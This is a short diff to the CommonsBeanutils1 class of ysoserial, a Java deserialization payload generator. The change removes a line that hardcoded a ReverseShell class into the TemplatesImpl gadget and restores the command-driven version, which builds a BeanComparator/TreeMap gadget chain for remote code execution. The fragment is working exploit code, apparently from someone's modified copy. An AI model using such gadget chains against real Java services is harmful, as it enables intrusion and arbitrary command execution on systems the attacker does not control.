@@ -26,8 +26,7 @@ import ysoserial.payloads.util.Reflections;
 public class CommonsBeanutils1 implements ObjectPayload<Object> {
 
 	public Object getObject(final String ... command) throws Exception {
-        Object templates = Gadgets.createTemplatesImpl(ReverseShell.class);
-//		final Object templates = Gadgets.createTemplatesImpl(command);
+		final Object templates = Gadgets.createTemplatesImpl(command);
 		// mock method name until armed
 		final BeanComparator comparator = new BeanComparator("activeServers");
 		return makeTreeMap(templates, comparator);
